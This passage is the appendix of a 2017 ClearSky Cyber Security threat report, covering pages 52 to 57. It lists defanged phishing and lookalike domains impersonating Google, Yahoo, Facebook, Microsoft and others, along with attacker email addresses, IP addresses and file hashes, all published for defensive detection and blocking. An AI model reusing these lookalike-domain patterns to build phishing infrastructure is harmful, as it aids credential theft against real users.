\naccou\nnts\n-\ngoogelmail[.]com\n \naccounts\n-\ngoogelmails[.]com\n \naccount\n-\nsignin\n-\nmyaccount\n-\nusers[.]ga\n \naccounts\n-\nlogins[.]net\n \naccountsrecovery[.]ddns[.]net\n \naccounts\n-\nservice[.]support\n \naccountsservice\n-\nsupport[.]com\n \naccount\n-\nsupport\n-\nuser[.]com\n \naccounts\n-\nyahoo[.]us\n \naccountts\n-\ngoogle[.]com\n \naccount\n-\nuser[.]com\n \naccount\n-\nuser\n-\npermission\n-\naccount[.]com\n \naccount\n-\nusers\n-\nmail[.]com\n \naccount\n-\nuser\n-\nverify\n-\nmail[.]com\n \nacounts\n-\nqooqie\n-\ncon[.]ml\n \naddons\n-\nmozilla[.]download\n \nae[.]ae[.]asus\n-\nsupport[.]net\n \nae[.]asus\n-\nsupport[.]net\n \nae[.]bocaiwang[.]\nasus\n-\nsupport[.]net\n \nae[.]client[.]asus\n-\nsupport[.]net\n \naipak[.]org\n \naiqac[.]org\n \naol\n-\nmail\n-\naccount[.]com\n \napache\n-\nutility[.]com\n \napi[.]com\n-\nservice[.]net\n \napp\n-\ndocuments[.]com\n \napp\n-\nfacebook[.]co\n \nappleid[.]apple[.]com[.]account\n-\nlogins[.]com\n \naraamco[.]com\n \naraamco[.]com\n \na\nrchive\n-\ncenter[.]com\n \nasus\n-\nsupport[.]net\n \nasus\n-\nupdate[.]com\n \nberozkhodro[.]com\n \nblog[.]group\n-\ngoogle[.]com\n \nbocaiwang[.]ae[.]asus\n-\nsupport[.]net\n \nbocaiwang[.]asus\n-\nsupport[.]net\n \nbocaiwang[.]bocaiwang[.]asus\n-\nsupport[.]net\n \nbocaiwang[.]client[.]asus\n-\nsupport[.]net\n \nbook\n-\narchivecenter[.]bid\n \nbooks\n-\narchivecenter[.]bid\n \nbooks\n-\narchivecenter[.]club\n \nbooks\n-\ngoogle[.]accountservice[.]support\n \nbooks\n-\ngoogle[.]books\n-\narchivecenter[.]bid\n \nbooks\n-\ngoogle[.]www[.]books\n-\narchivecenter[.]bid\n \nbooks\n-\nview[.]com\n \nbootstrap[.]serveftp[.]com\n \nbritis\nhnews[.]com[.]co\n \nbritishnews[.]org\n \nbroadcastbritishnews[.]com\n \nbrookings\n-\nedu[.]in\n \nchange\n-\nmail\n-\naccounting\n-\nregister\n-\nsingle[.]com\n \nchange\n-\nmail\n-\naccount\n-\nnodes\n-\npermision[.]com\n \nchange\n-\npermission\n-\nmail\n-\nuser\n-\nmanagment[.]com\n \nchange\n-\nuser\n-\naccount\n-\nmail\n-\npermission[.]com\n \ncl\nient[.]ae[.]asus\n-\nsupport[.]net\n \nclient[.]asus\n-\nsupport[.]net\n \nclient[.]bocaiwang[.]asus\n-\nsupport[.]net\n \nclient[.]client[.]asus\n-\nsupport[.]net\n \ncodeconfirm\n-\nrecovery[.]bid\n \ncodeconfirm\n-\nrecovery[.]club\n \ncom\n-\naccount\n-\nlogin[.]com\n \ncom\n-\naccountrecovery[.]bid\n \ncom\n-\naccountsecure\n-\nrecovery[.]name\n \ncom\n-\naccountsrecovery[.]name\n \ncom\n-\narchivecenter[.]work\n \ncom\n-\ncustomeradduser[.]bid\n \ncom\n-\ncustomerservice[.]bid\n \ncom\n-\ncustomerservice[.]name\n \ncom\n-\ncustomerservices[.]name\n \ncom\n-\ncustomersuperuser[.]bid\n \n  \nPage \n52\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \ncom\n-\ndownload[.]ml\n \ncom\n-\nmanage\n-\naccou\nntuser[.]club\n \ncom\n-\nmessagecenter[.]bid\n \ncom\n-\nmessengerservice[.]bid\n \ncom\n-\nmessengerservice[.]work\n \ncom\n-\nmicrosoftonline[.]club\n \ncom\n-\nmychannel[.]bid\n \ncom\n-\norginal\n-\nlinks[.]ga\n \ncom\n-\nrecoversessions[.]bid\n \ncom\n-\nrecovery[.]com\n \ncom\n-\nrecoveryadduser[.]bid\n \ncom\n-\nrecoveryidentifier\n[.]bid\n \ncom\n-\nrecoveryidentifier[.]name\n \ncom\n-\nrecoveryidentifiers[.]bid\n \ncom\n-\nrecoverymail[.]bid\n \ncom\n-\nrecoverysecureuser[.]club\n \ncom\n-\nrecoverysecureusers[.]club\n \ncom\n-\nrecoveryservice[.]bid\n \ncom\n-\nrecoveryservice[.]info\n \ncom\n-\nrecoverysessions[.]bid\n \ncom\n-\nrecoverysubusers[.]bid\n \ncom\n-\nrecoverysuperuser[.]bid\n \ncom\n-\nrecoverysuperuser[.]club\n \ncom\n-\nrecoverysuperuser[.]name\n \ncom\n-\nrecoverysuperusers[.]bid\n \ncom\n-\nrecoverysupport[.]bid\n \ncom\n-\nrecoverysupport[.]club\n \ncom\n-\nservice[.]net\n \ncom\n-\nservicecustomer[.]bid\n \ncom\n-\nservicecustom\ner[.]name\n \ncom\n-\nservicemail[.]bid\n \ncom\n-\nservicerecovery[.]bid\n \ncom\n-\nservicerecovery[.]club\n \ncom\n-\nservicerecovery[.]info\n \ncom\n-\nservicerecovery[.]name\n \ncom\n-\nservicescustomer[.]name\n \ncom\n-\nserviceslogin[.]com\n \ncom\n-\nshowvideo[.]gq\n \ncom\n-\nstatistics[.]com\n \ncom\n-\nstats[.]com\n \ncom\n-\nvideo\n[.]net\n \ncom\n-\nvideoservice[.]work\n \ncom\n-\nviewchannel[.]club\n \nconfirm\n-\ncode[.]account\n-\nsupport\n-\nuser[.]com\n \ncrcperss[.]com\n \ncvcreate[.]org\n \ndigitalqlobe[.]com\n \ndisplay\n-\nerror\n-\nruntime[.]com\n \ndisplay\n-\nganavaro\n-\nabrashimchi[.]com\n \ndocs\n-\ngoogle[.]co\n \ndocuments[.]sytes[.]net\n \ndocuments\n-\nsupportsharing[.]bid\n \ndocuments\n-\nsupportsharing[.]club\n \ndocument\n-\nsupportsharing[.]bid\n \ndoc\n-\nviewer[.]com\n \ndownload[.]account\n-\nlogin[.]net\n \ndownload\n-\ngoogle[.]com\n-\norginal\n-\nlinks[.]ga\n \ndownload\n-\ngoogle[.]orginal\n-\nlinks[.]com\n \ndownload\n-\nlink[.]top\n \ndrive[.]change\n-\nm\nail\n-\naccount\n-\nnodes\n-\npermision[.]com\n \ndrive[.]google[.]com[.]accounts[.]activities[.]devic\nes[.]com[.]usersettings[.]cf\n \ndrive[.]google[.]com[.]accounts[.]google[.]com[.]u\nsersettings[.]cf\n \ndrive[.]google[.]com[.]drive[.]google[.]com[.]users\nettings[.]cf\n \ndrive[.]go\nogle[.]com[.]usersettings[.]cf\n \ndrive[.]privacy\n-\nyahoomail[.]com\n \ndrive\n-\ndownload[.]account\n-\nsupport\n-\nuser[.]com\n \ndrive\n-\ndownload[.]account\n-\nuser\n-\npermission\n-\naccount[.]com\n \ndrive\n-\nfile[.]account\n-\nsupport\n-\nuser[.]com\n \ndrive\n-\ngoogle[.]co\n \ndrive\n-\nlogin[.]cf\n \ndrive\n-\nmail[.]accoun\nt\n-\nsupport\n-\nuser[.]com\n \ndrive\n-\npermission\n-\nuser\n-\naccount[.]com\n \ndrivers[.]document\n-\nsupportsharing[.]bid\n \ndrives\n-\ngoogle[.]co\n \ndrives\n-\ngoogle[.]com\n \ndrives\n-\ngoogle[.]com[.]co\n \ndrive\n-\nuseraccount\n-\nsignin\n-\nmail[.]ga\n \ndropbox[.]com\n-\nservicecustomer[.]name\n \ndropbox[.]com\n-\nservicescustomer[.]name\n \ndrop\n-\nbox[.]vip\n \ndropebox[.]co\n \nembraer[.]co\n \nemiartas[.]com\n \nerror\n-\nexchange[.]com\n \neursaia[.]org\n \nfacebook[.]com\n-\nservice[.]gq\n \nfacebook[.]notification\n-\naccountrecovery[.]com\n \nfanderfart22[.]xyz\n \nfardenfart2017[.]xyz\n \nfb[.]com\n-\ndow\nnload[.]ml\n \nfb\n-\nlogin[.]cf\n \nftp[.]account\n-\nlogins[.]com\n \nftp[.]account\n-\npermission\n-\nmail\n-\nuser[.]com\n \nftp[.]accountservice[.]support\n \nftp[.]accountsservice\n-\nsupport[.]com\n \nftp[.]archive\n-\ncenter[.]com\n \nftp[.]britishnews[.]com[.]co\n \nftp[.]com\n-\nrecoveryservice[.]info\n \nftp[.]c\nom\n-\nservice[.]net\n \nftp[.]goo\n-\ngle[.]cloud\n \nftp[.]goo\n-\ngle[.]mobi\n \n  \nPage \n53\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nftp[.]microsoft\n-\nupgrade[.]mobi\n \nftp[.]news\n-\nonlines[.]info\n \nftp[.]officialswebsites[.]info\n \nftp[.]orginal\n-\nlinks[.]com\n \nftp[.]screen\n-\nroyall\n-\nin\n-\ncorporate[.]com\n \nftp[.]screen\n-\nshotuser\n-\ntrash\n-\ngreen[.]com\n \nftp[.]sdfsd[.]screen\n-\nroyall\n-\nin\n-\ncorporate[.]com\n \nftp[.]service\n-\nbroadcast[.]com\n \nftp[.]service\n-\nrecoveryaccount[.]com\n \nftp[.]set\n-\nymail\n-\nuser\n-\naccount\n-\npermission\n-\nchallenge[.]com\n \nftp[.]support\n-\naasaam[.]com\n \nftp[.]support\n-\nrecoverycustomers[.]com\n \nftp[.]uk\n-\nservice[.]org\n \nftp[.]verify\n-\naccount[.]services\n \nftp[.]w3schools\n-\nhtml[.]com\n \nftp[.]www[.]britishnews[.]com[.]co\n \nftp[.]www[.]screen\n-\nshotuser\n-\ntrash\n-\ngreen[.]com\n \ngle\n-\nmail[.]com\n \ngmail[.]com\n-\nrecoverymail[.]bid\n \ngmail[.]com\n-\nu6[.]userlogin[.]security\n-\nlogin[.]activity[.]com\n-\nverifica\ntion\n-\naccounts[.]com\n \ngmail\n-\nrecovery[.]ml\n \ngmal[.]cf\n \ngoog\n-\nle[.]bid\n \ngoo\n-\ngle[.]bid\n \ngoo\n-\ngle[.]cloud\n \ngoogle[.]mail[.]com\n-\nservicecustomer[.]bid\n \ngoogle[.]mail[.]mail[.]google[.]com\n-\nservicecustomer[.]bid\n \ngoogle[.]mail[.]www[.]com\n-\nservicecustomer[.]bid\n \ngoo\n-\ngle[.]mobi\n \ngoogle\n-\ndrive[.]account\n-\nservicerecovery[.]com\n \ngoogle\n-\ndrive[.]accounts\n-\nservice[.]support\n \ngoogle\n-\ndrive[.]account\n-\nsupport\n-\nuser[.]com\n \ngoogle\n-\ndrive[.]com[.]accountservice[.]support\n \ngoogle\n-\ndrive[.]service\n-\nrecoveryaccount[.]com\n \ngoogle\n-\nhangout[.]accountservice[.]support\n \ngoogle\n-\nhangout[.]accounts\n-\nservice[.]support\n \ngoogle\n-\nhangout[.]account\n-\nsupport\n-\nuser[.]com\n \ngoogle\n-\nhangout[.]verify\n-\naccount[.]services\n \ngoogle\n-\nmail[.]com[.]co\n \ngooglemail[.]com\n-\ncustomersuperuser[.]bid\n \ngoogle\n-\nmail\n-\nrecover\ny[.]com\n \ngooglemails[.]co\n \ngoogle\n-\nprofile[.]com\n \ngoogle\n-\nprofiles[.]com\n \ngoogle\n-\nsetting[.]com\n \ngoogle\n-\nverification[.]com\n \ngoogle\n-\nverify[.]com\n \ngoogle\n-\nverify[.]net\n \nhangout[.]com\n-\nmessagecenter[.]bid\n \nhangout[.]messageservice[.]club\n \nhelp\n-\nrecovery[.]com\n \nhot\n-\nmail[.]ml\n \nh\nqr\n-\nmail[.]nioc\n-\nintl[.]account\n-\nuser\n-\npermission\n-\naccount[.]com\n \nid\n-\nbayan[.]com\n \niforget\n-\nmemail\n-\nuser\n-\naccount[.]com\n \niranianuknews[.]com\n \nir\n-\nowa\n-\naccountservice[.]bid\n \nitunes\n-\nid\n-\naccount[.]users\n-\nlogin[.]com\n \nk2intelliqence[.]com\n \nk2intelliqence[.]com\n \nkomputertipstrik[.]com\n-\ncustomeradduser[.]bid\n \nline\n-\nen[.]me\n \nlog[.]account[.]accountservice[.]support\n \nlogin[.]com\n-\nservice[.]net\n \nlogin[.]radio\n-\nm[.]cf\n \nlogin\n-\naccount[.]net\n \nlogin\n-\naccount\n-\ngoogle[.]orginal\n-\nlinks[.]com\n \nlogin\n-\naccount\n-\nmail[.]com\n \nlogin\n-\nagain[.]ml\n \nlogin\n-\nmail[.]account\n-\nservicerecovery[.]com\n \nlogin\n-\nmail[.]verify\n-\naccount[.]services\n \nlogin\n-\nmails[.]account\n-\nservicerecovery[.]com\n \nlogin\n-\nmails[.]accounts\n-\nservice[.]support\n \nlogin\n-\nmails[.]account\n-\nsupport\n-\nuser[.]com\n \nlogin\n-\nmails[.]verify\n-\naccount[.]services\n \nlogin\n-\nrequire\nd[.]ga\n \nlogin\n-\nrequired[.]ml\n \nlogin\n-\nrequired[.]tk\n \nlogins\n-\nmails[.]account\n-\ncustomerservice[.]com\n \nlogins\n-\nmails[.]account\n-\nservicerecovery[.]com\n \nlogins\n-\nmails[.]accounts\n-\nservice[.]support\n \nlogins\n-\nmails[.]accountsservice\n-\nsupport[.]com\n \nlogins\n-\nmails[.]com\n-\nservicecustom\ner[.]name\n \nlogins\n-\nmails[.]service\n-\nrecoveryaccount[.]com\n \nlogin\n-\nwebmail[.]accounts\n-\nservice[.]support\n \nlogin\n-\nwebmail[.]account\n-\nsupport\n-\nuser[.]com\n \nlogin\n-\nwebmail[.]verify\n-\naccount[.]services\n \nlogn\n-\nmicrsftonine\n-\ncon[.]ml\n \nm[.]com\n-\nservice[.]net\n \nmail[.]account\n-\ngoogle[.]co\n \nmail[.]com\n-\nservice[.]net\n \nmail[.]google[.]com\n-\ncustomerservice[.]name\n \nmail[.]google[.]com\n-\ncustomerservices[.]name\n \nmail[.]google[.]com\n-\nrecoveryservice[.]info\n \nmail[.]google[.]com\n-\nservicecustomer[.]bid\n \nmail[.]google[.]com\n-\nservicescust\nomer[.]name\n \nmail[.]google[.]mail[.]google[.]com\n-\nservicecustomer[.]bid\n \nmail[.]google[.]www[.]com\n-\nservicecustomer[.]bid\n \nmail[.]google[.]www[.]dropbox[.]com\n-\nservicescustomer[.]name\n \nmail[.]group\n-\ngoogle[.]com\n \n  \nPage \n54\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nmail[.]mehrnews[.]info\n \nmail[.]orginal\n-\nlinks[.]com\n \nma\nil[.]yahoo[.]com\n-\nservicecustomer[.]name\n \nmail[.]youtube\n-\ncom[.]watch\n \nmail3[.]google[.]com\n-\nservicecustomer[.]name\n \nmail\n-\naccount\n-\nregister\n-\nrecovery[.]com\n \nmailgate[.]youtube\n-\ncom[.]watch\n \nmailgoogle[.]com\n-\nrecoveryidentifier[.]bid\n \nmailgoogle[.]com\n-\nrecoverymail[.]bid\n \nmailgoogle[.]com\n-\nrecoveryservice[.]bid\n \nmailgoogle[.]com\n-\nrecoverysuperuser[.]bid\n \nmailgoogle[.]com\n-\nrecoverysupport[.]bid\n \nmail\n-\ngoogle[.]com\n-\nservicecustomer[.]name\n \nmailgoogle[.]com\n-\nservicerecovery[.]bid\n \nmail\n-\ninbox[.]account\n-\nsupport\n-\nuser[.]com\n \nmail\n-\nlogin[.]account\n-\nlogin[.]net\n \nmail\n-\nlogin[.]accountservice[.]support\n \nmail\n-\nlogin[.]account\n-\nservicerecovery[.]com\n \nmail\n-\nlogin[.]service\n-\nrecoveryaccount[.]com\n \nmail\n-\nlogin[.]verify\n-\naccount[.]services\n \nmail\n-\nmacroadvisorypartners[.]ml\n \nmails[.]com\n-\nservicerecovery[\n.]name\n \nmails\n-\naccount\n-\nsignin\n-\nusers\n-\npermssion[.]com\n \nmailscustomer[.]recovery\n-\nemailcustomer[.]com\n \nmailssender[.]bid\n \nmail\n-\nuser\n-\npermission\n-\nsharedaccount[.]com\n \nmail\n-\nusr[.]account\n-\nsupport\n-\nuser[.]com\n \nmail\n-\nverify[.]account\n-\nsupport\n-\nuser[.]com\n \nmail\n-\nyahoo[.]com[.]co\n \nm\narket\n-\naccount\n-\nlogin[.]net\n \nme[.]youtube[.]com\n-\nmychannel[.]bid\n \nmehrnews[.]info\n \nmessageservice[.]bid\n \nmessageservice[.]club\n \nmfacebook[.]login\n-\nrequired[.]ga\n \nmicrosoft\n-\nhotfix[.]com\n \nmicrosoft\n-\nupdate[.]bid\n \nmicrosoft\n-\nupgrade[.]mobi\n \nmicrosoft\n-\nutility[.]com\n \nmsoffice\n-\nupdate[.]com\n \nmx1[.]group\n-\ngoogle[.]com\n \nmy[.]youtube[.]com\n-\nmychannel[.]bid\n \nmyaccount\n-\nlogin[.]net\n \nmychannel[.]ddns[.]net\n \nmychannel[.]ddns[.]net\n \nmydrives[.]documents\n-\nsupportsharing[.]bid\n \nmyemails[.]com\n-\nrecoverysuperuser[.]name\n \nmy\n-\nhealthequity[.]com\n \nmymail[.]com\n-\nrecoveryidentifiers[.]bid\n \nmymail[.]com\n-\nrecoverysuperuser[.]name\n \nmy\n-\nmailcoil[.]ml\n \nmymails[.]com\n-\nrecoverysuperuser[.]bid\n \nmymails[.]com\n-\nrecoverysuperuser[.]name\n \nmyscreenname[.]bid\n \nnews\n-\nonlines[.]info\n \nnex1music[.]ml\n \nnotification\n-\naccountrecovery[.]\ncom\n \nns1[.]check\n-\nyahoo[.]com\n \nns1[.]com\n-\nservice[.]net\n \nns2[.]check\n-\nyahoo[.]com\n \nnvidia\n-\nsupport[.]com\n \nnvidia\n-\nupdate[.]com\n \nofficialswebsites[.]info\n \nofficial\n-\nuploads[.]com\n \nogin\n-\nmails[.]accounts\n-\nservice[.]support\n \nonedrive\n-\nsignin[.]com\n \nonlinedocument[.]bid\n \nonlinedo\ncuments[.]org\n \nonlinedrie\n-\naccount\n-\npermission\n-\nverify[.]com\n \nonlineserver[.]myftp[.]biz\n \nonline\n-\nsupportaccount[.]com\n \norginal\n-\nlinks[.]com\n \noutlook\n-\nlivecom[.]bid\n \nowa\n-\ninsss\n-\norg\n-\nill\n-\nowa\n-\nauthen[.]ml\n \npaypal[.]com[.]webapp[.]logins\n-\nmails[.]service\n-\nrecoveryaccount[.]com\n \npaypal[.]com[.]webapp[.]paypal[.]com[.]webapp[.\n]service\n-\nrecoveryaccount[.]com\n \npaypal[.]com[.]webapp[.]service\n-\nrecoveryaccount[.]com\n \npicofile[.]xyz\n \npolicy\n-\nfacebook[.]com\n \npop[.]group\n-\ngoogle[.]com\n \nprivacy\n-\nfacebook[.]com\n \nprivacy\n-\ngmail[.]com\n \nprivacy\n-\nyahoomail[\n.]com\n \nprofile[.]facebook[.]accountservice[.]support\n \nprofile[.]facebook[.]notification\n-\naccountrecovery[.]com\n \nprofile\n-\nfacebook[.]co\n \nprofiles\n-\nfacebook[.]com\n \nprofile\n-\nverification[.]com\n \nqet\n-\nadobe[.]com\n \nradio\n-\nm[.]cf\n \nraykiel[.]net\n \nrecoverycodeconfirm[.]bid\n \nrecove\nry\n-\ncustomerservice[.]com\n \nrecovery\n-\nemailcustomer[.]com\n \nrecoverysuperuser[.]bid\n \nregister\n-\nmultiplay[.]ml\n \nreset\n-\nlogin[.]accountservice[.]support\n \nreset\n-\nlogin[.]account\n-\nsupport\n-\nuser[.]com\n \nreset\n-\nlogin\n-\nyahoo\n-\ncom[.]account\n-\nsupport\n-\nuser[.]com\n \nreset\n-\nmail[.]account\n-\nsupport\n-\nuser[.]com\n \n  \nPage \n55\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nreset\n-\nmail\n-\nyahoo\n-\ncom[.]account\n-\nsupport\n-\nuser[.]com\n \nresets\n-\nmails[.]account\n-\nsupport\n-\nuser[.]com\n \nresult2[.]com\n-\nservicescustomer[.]name\n \nresult2[.]www[.]dropbox[.]com\n-\nservicescustomer[.]name\n \nsadashboard[.]com\n \nsaudiarabiadig\nitaldashboards[.]com\n \nsaudi\n-\ngovernment[.]com\n \nsaudi\n-\nhaj[.]com\n \nscreen\n-\nroyall\n-\nin\n-\ncorporate[.]com\n \nscreen\n-\nshotuser\n-\ntrash\n-\ngreen[.]com\n \nsdfsd[.]screen\n-\nroyall\n-\nin\n-\ncorporate[.]com\n \nsdfsd[.]screen\n-\nshotuser\n-\ntrash\n-\ngreen[.]com\n \nsecurity\n-\nsupportteams\n-\nmail\n-\nchange[.]ga\n \nservice\n-\naccountrecovery[.]com\n \nservice\n-\nbroadcast[.]com\n \nservicecustomer[.]bid\n \nservicelogin\n-\nmail[.]account\n-\nservicerecovery[.]com\n \nservice\n-\nlogins[.]net\n \nservicemailbroadcast[.]bid\n \nservice\n-\nrecoveryaccount[.]com\n \nset\n-\nymail\n-\nuser\n-\naccount\n-\npermission\n-\nchallenge[.]com\n \nshared\n-\nac\ncess[.]com\n \nshared\n-\nlogin[.]com\n \nshared\n-\npermission[.]com\n \nshop[.]account\n-\ndropbox[.]net\n \nshorturlbot[.]club\n \nshow[.]video\n-\nyoutube[.]cf\n \nshow\n-\nvideo[.]info\n \nslmkhubi[.]ddns[.]net\n \nsmstagram[.]com\n \nsmtp[.]com\n-\nservice[.]net\n \nsmtp[.]group\n-\ngoogle[.]com\n \nsmtp[.]youtube\n-\ncom[.]watch\n \nsports[.]accountservice[.]support\n \nsprinqer[.]com\n \nsupport[.]account\n-\ngoogle[.]co\n \nsupport\n-\naasaam[.]bid\n \nsupport\n-\naasaam[.]com\n \nsupport\n-\naccountsrecovery[.]com\n \nsupport\n-\ngoogle[.]co\n \nsupport\n-\nrecoverycustomers[.]com\n \nsupports\n-\nrecoverycustomer\ns[.]com\n \nsupport\n-\nverify\n-\naccount\n-\nuser[.]com\n \ntadawul[.]com[.]co\n \ntai\n-\ntr[.]com\n \ntcp[.]shorturlbot[.]club\n \nteam\n-\nspeak[.]cf\n \nteam\n-\nspeak[.]ga\n \nteam\n-\nspeak[.]ml\n \nteamspeak\n-\ndownload[.]ml\n \nteamspeaks[.]cf\n \ntelagram[.]cf\n \ntest[.]service\n-\nrecoveryaccount[.]com\n \ntoken\n-\nep[.]com\n \nuk\n-\nservice[.]org\n \nupdate\n-\nchecker[.]net\n \nupdate\n-\ndriversonline[.]bid\n \nupdate\n-\ndriversonline[.]club\n \nupdate\n-\nfinder[.]com\n \nupdate\n-\nmicrosoft[.]bid\n \nupdater\n-\ndriversonline[.]club\n \nupdate\n-\nsystem\n-\ndriversonline[.]bid\n \nuploader[.]sytes[.]net\n \nupload\n-\nservices[.]com\n \nuri[.]cab\n \nus\n[.]battle[.]net[.]cataclysm[.]account\n-\nlogins[.]com\n \nusersettings[.]cf\n \nusers\n-\nfacebook[.]com\n \nusers\n-\nlogin[.]com\n \nusers\n-\nyahoomail[.]com\n \nutc[.]officialswebsites[.]info\n \nutopaisystems[.]net\n \nverify\n-\naccount[.]services\n \nverify\n-\naccounts[.]info\n \nverify\n-\nfacebook[.]com\n \nveri\nfy\n-\ngmail[.]tk\n \nverify\n-\nyour\n-\naccount\n-\ninformation[.]users\n-\nlogin[.]com\n \nvideo[.]yahoo[.]com[.]accountservice[.]support\n \nvideo[.]yahoo[.]com\n-\nshowvideo[.]gq\n \nvideo[.]youtube[.]com\n-\nshowvideo[.]ga\n \nvideo\n-\nmail[.]account\n-\nsupport\n-\nuser[.]com\n \nvideo\n-\nyahoo[.]accountservice[.]\nsupport\n \nvideo\n-\nyahoo[.]account\n-\nsupport\n-\nuser[.]com\n \nvideo\n-\nyahoo[.]com[.]accountservice[.]support\n \nvideo\n-\nyoutube[.]cf\n \nw3sch00ls[.]hopto[.]org\n \nw3school[.]hopto[.]org\n \nw3schools[.]hopto[.]org\n \nw3schools\n-\nhtml[.]com\n \nwatch\n-\nyoutube[.]org[.]uk\n \nwebmaiil\n-\ntau\n-\nac\n-\nil[.]ml\n \nwebmail\n-\nlogin[.]accountservice[.]support\n \nwebmail\n-\ntidhar\n-\nco\n-\nil[.]ml\n \nwildcarddns[.]com\n-\nservice[.]net\n \nwindows\n-\nupdate[.]systems\n \nwp[.]com\n-\nmicrosoftonline[.]club\n \nww2[.]group\n-\ngoogle[.]com\n \nww62[.]group\n-\ngoogle[.]com\n \nww62[.]mx1[.]group\n-\ngoogle[.]com\n \nww92[.]group\n-\ngoog\nle[.]com\n \nxn\n--\ngooge\n-\nq2e[.]ml\n \n  \nPage \n56\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \nyahoo[.]com[.]accountservice[.]support\n \nyahoo\n-\nproflles[.]com\n \nyahoo\n-\nverification[.]net\n \nyahoo\n-\nverification[.]org\n \nyahoo\n-\nverify[.]net\n \nyouetube[.]ga\n \nyourl[.]bid\n \nyouttube[.]ga\n \nyouttube[.]gq\n \nyoutubbe[.]cf\n \nyoutubbe[.]ml\n \nyoutube[.]com[.]login\n-\naccount[.]net\n \nyoutube[.]com\n-\nservice[.]gq\n \nyoutube\n-\ncom[.]watch\n \nyoutubee\n-\nvideos[.]com\n \nyoutubes[.]accounts[.]com\n-\nserviceslogin[.]com\n \nyoutuebe[.]co\n \nyoutuobe[.]com[.]co\n \nyouutube[.]cf\n \nyurl[.]bid\n \nadmin@doc\n-\nviewer.com\n \nadmin@dropebox.co\n \nadmin@s\ncreen\n-\nroyall\n-\nin\n-\ncorporate.com\n \nadmin@screen\n-\nshotuser\n-\ntrash\n-\ngreen.com\n \nanita.jepherson@gmail.com\n \naryaieiran@gmail.com\n \naryaieiran@gmail.com\n \nbahra.azadeh88@gmail.com\n \ncave.detector@yandex.com\n \ncave.detector@yandex.com\n \ncenter2016@yandex.com\n \nchada.martini@yandex.co\nm\n \nchada.martini@yandex.com\n \ncool.hiram@yandex.com\n \ncustomers.mailservice@gmail.com\n \ncustomers.noreplyservice@gmail.com\n \ninternational.research@mail.com\n \nisabella.careyy@gmail.com\n \nisabella.careyy@gmail.com\n \njohn.lennon@uymail.com\n \njully.martin@yandex.com\n \njully.martin@yandex.com\n \nmails.customerservices@gmail.com\n \nmartin.switch911@gmail.com\n \nmartin.switch911@gmail.com\n \nmessage.intercom@gmail.com\n \nmessage.intercom@gmail.com\n \nnami.rosoki@gmail.com\n \nonline.nic@yandex.com\n \nonline.nic@yandex.com\n \nrich.safe@yandex.com\n \nrski\ntman@gmail.com\n \nsali.rash@yandex.com\n \nsali.rash@yandex.com\n \nservice.center2016@yandex.com\n \nservice.center2016@yandex.com\n \nsuspended.user.noitification@gmail.com\n \nyaffa.hyatt9617@gmail.com\n \n107.150.38.19\n \n107.150.60.156\n \n107.150.60.158\n \n107.6.179.131\n \n136.243.108.100\n \n136.243.221.148\n \n136.243.226.189\n \n137.74.131.208\n \n137.74.148.218\n \n144.76.97.61\n \n144.76.97.62\n \n145.239.120.88\n \n149.56.135.42\n \n149.56.201.205\n \n158.255.1.34\n \n164.132.251.217\n \n164.132.29.69\n \n173.208.129.180\n \n173.244.180.131\n \n173.244.180.132\n \n173.244.180.133\n \n173.244.180.134\n \n173.45.108.55\n \n173.90.180.125\n \n178.33.38.128\n \n185.117.74.165\n \n185.141.24.64\n \n185.141.24.66\n \n185.82.202.174\n \n192.99.127.216\n \n194.88.107.63\n \n204.12.207.108\n \n204.12.207.110\n \n204.12.242.84\n \n204.12.242.85\n \n207.244.77.15\n \n207.244.79.143\n \n207.244.79.144\n \n207.244.79.147\n \n207.244.79.148\n \n208.110.73.219\n \n208.110.73.220\n \n208.110.73.221\n \n208.110.73.222\n \n209.190.3.113\n \n209.190.3.114\n \n209.190.3.115\n \n209.190.3.41\n \n  \nPage \n57\n \nof \n59\n \n\u00a9All rights reserved to \nClearSky Cyber Security\n, 2017\n \n \n \n209.190.3.42\n \n209.190.3.43\n \n213.152.173.198\n \n213.32.11.30\n \n213.32.49.232\n \n217.23.3.158\n \n217.23.5.166\n \n31.3.236.90\n \n31.3.236.91\n \n31.3.23\n6.92\n \n37.220.8.13\n \n46.17.97.240\n \n46.17.97.243\n \n46.17.97.37\n \n46.17.97.40\n \n5.152.202.51\n \n5.152.202.52\n \n5.79.105.153\n \n5.79.105.156\n \n5.79.105.161\n \n5.79.105.165\n \n5.79.69.198\n \n51.254.254.217\n \n51.255.28.57\n \n54.36.217.8\n \n69.30.221.126\n \n69.30.224.244\n \n69.30.224.245\n \n81.171.25.229\n \n81.171.25.232\n \n85.17.172.170\n \n86.105.1.111\n \n91.218.245.251\n \n92.222.206.208\n \n93.158.200.170\n \n93.158.215.50\n \n93.158.215.52\n \n94.23.90.226\n \n00b5d45433391146ce98cd70a91bef08\n \n07fb3f925f8ef2c53451b37bdd070b55\n \n0a3f454f94ef0f723ac6a4ad3f5bdf01\n \n0e3cb289f65ef5faf40fa830ac9b1b\nf6\n \n1c00fd5e1ddd0226bd854775180fd361\n \n1db12ec1f335ee5995b29dea360514a2\n \n20f2da7b0c482ab6a78e9bd65a1a3a92\n \n253b4f5c6611a4bc9c7f5269b127c8e9\n \n3261d45051542ab3e54fa541f132f899\n \n356439bfb9b2f49858897a22dd85df86\n \n365482f10808ddd1d26f3dc19c41c993\n \n3bb2f304a59255dddc5ef6bb0a32aec7\n \n3edec580845d7ab85fa893afb391fbfb\n \n5e9a458dcdfc9d2ce996081ec87c30e0\n \n5ec9f484603b89f80f351bb88279ebb1\n \n6bd505616e12e3dd7f2287f24f34609f\n \n6cfa579dd1d33c2fa42d85c2472f744c\n \n7df3a83dfcce130c01aabede3cfe8140\n \n7e1cf48d84e503499c9718c50\ne7a1c52\n \n9c7ae44baf8df000bb614738370d1171\n \n9d0e761f3803889dc83c180901dc7b22\n \na43b7cc495741248f3647e647f776467\n \na9117da1cb51adbc88a52a6e3b16a6c4\n \nae797446710e375f0fc9a33432d64256\n \naf5c01a7a3858bc3712ab69bc673cec4\n \nbd0a6fe7a852fdd61c1da37cf99103d2\n \nbe207941ce8a5e212\nbe8dde83d05d38d\n \nbfd21f2847c1d7aa0f409ef52ed52e05\n 